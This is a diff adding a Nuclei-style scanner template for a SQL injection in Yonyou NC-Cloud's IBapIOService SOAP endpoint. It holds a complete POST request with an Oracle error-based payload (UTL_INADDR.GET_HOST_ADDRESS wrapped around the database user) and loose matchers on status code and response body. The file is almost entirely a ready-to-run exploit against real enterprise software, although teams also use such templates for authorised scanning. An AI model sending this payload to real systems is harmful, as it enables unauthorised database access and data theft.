@@ -1,0 +1,53 @@
+id: yonyou-nc-cloud-IBapIOService-sqli
+info:
+  name: 用友NC-Cloud IBapIOService存在SQL注入  
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/gelusus/wxvl/blob/6ad8b88dbb4a02cb1fc0fa75d148a194454dd716/doc/2025-07/%E3%80%902025%E6%8A%A4%E7%BD%91%E6%BC%8F%E6%B4%9EPOC%E9%80%9F%E5%AD%98%E3%80%91%E5%90%83%E8%8B%95%E7%9A%AE%E5%96%9D%E6%8C%AA%E7%93%A6%EF%BC%8CHW%E8%BD%BB%E6%9D%BE%E6%8B%BF%E6%8D%8F.md?plain=1#L211
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: yonyou,oa,sqli,nccloud
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
+          <soapenv:Header/>
+            <soapenv:Body>
+                <gs:getBapTableDatas>
+                  <gs:stringarrayItem>
+                      DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')-- abc
+                  </gs:stringarrayItem>
+                </gs:getBapTableDatas>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - status_code == 500
+        condition: or
+
+      - type: dsl
+        dsl:
+          - contains_all(body,'schemas.xmlsoap.org')
